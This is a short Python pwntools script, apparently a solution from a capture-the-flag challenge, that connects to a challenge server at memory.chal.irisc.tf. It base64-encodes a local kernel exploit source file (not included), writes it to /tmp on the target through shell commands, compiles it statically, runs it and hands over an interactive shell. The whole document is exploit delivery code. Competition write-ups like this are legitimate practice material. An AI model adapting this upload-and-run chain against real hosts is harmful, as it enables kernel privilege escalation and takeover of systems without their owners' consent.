#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 1337 --host memory.chal.irisc.tf
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')

host = args.HOST or 'memory.chal.irisc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    io = connect("localhost", port)
    return io

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

io = start()

with open('solve.c', 'r') as f:
    kdata = f.read()

chunk_size = 128
with log.progress('Uploading kernel exploit...') as p:
  #for i in range(0, len(kdata), chunk_size):
  c = b64e(kdata.encode())
  io.sendlineafter('$', 'echo %s | base64 -d >> /tmp/solve.c' % c)

with log.progress('Exploit...') as p:
  io.sendlineafter('$ ', 'cd /tmp/')
  io.sendlineafter('$ ', 'gcc -o solve solve.c -static -lpthread')
  io.sendlineafter('$ ', './solve')

io.interactive()

